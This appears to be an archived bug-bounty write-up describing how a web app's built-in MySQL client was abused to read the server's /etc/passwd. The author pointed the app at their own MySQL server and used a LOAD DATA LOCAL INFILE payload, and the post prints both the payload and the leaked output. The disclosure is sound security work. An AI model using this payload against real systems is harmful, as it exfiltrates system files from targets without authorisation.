---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-15_client-not-client.md
original_filename: 2019-09-15_client-not-client.md
title: Client, not client!
category: documents
detected_topics:
- command-injection
- path-traversal
tags:
- imported
- documents
- command-injection
- path-traversal
language: en
raw_sha256: 9a16512ccd2ab776c8ff6335072f8f2062aaadc04f17734f8fff7da4e0d8ff87
text_sha256: a7e2fd33bdb0ca23d61e1ee18eb728b3099b039464e76df911429b524c45e2b8
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Client, not client!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-15_client-not-client.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `9a16512ccd2ab776c8ff6335072f8f2062aaadc04f17734f8fff7da4e0d8ff87`
- Text SHA256: `a7e2fd33bdb0ca23d61e1ee18eb728b3099b039464e76df911429b524c45e2b8`


## Content

---
title: "Client, not client!"
url: "https://medium.com/@tungpun/client-not-client-aa448cfdedd2"
authors: ["Tung Pun"]
bugs: ["LFI"]
bounty: "1,000"
publication_date: "2019-09-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5024
scraped_via: "browseros"
---

# Client, not client!

Client, not client!
Tung Pun
Follow
2 min read
·
Sep 15, 2019

63

This blog describes one of my findings on a private program. The attack vector is simple, short and elegant (at least for me).

Simplicity is the ultimate sophistication.

One day, HackerOne asked me to join a private program. OK. I decided to have a look.

Get Tung Pun’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

After creating the test account, I was asked to fill the source info:

Press enter or click to view image in full size
Database connection parameters are required! (The website frontend has been changed to protect their privacy)

There is a MySQL client in the application, it will connect to our own MySQL server. So, I created the new user, database, table on my server and open that port. For the SQL SELECT box, fill this payload:

LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE dadadb.dadatable FIELDS TERMINATED BY "\n"
Press enter or click to view image in full size

Then sent the request and got the target file /etc/passwd on my server.

mysql> select * from test;
+----------------------------------------------+
| value  |
+----------------------------------------------+
| root:x:0:0:root:/root:/bin/bash  |  | ...  |
| ...  |
+----------------------------------------------+

Submit the report and got the bounty.

Press enter or click to view image in full size

If you like my sharing, please consider buying me a coffee. ☕️
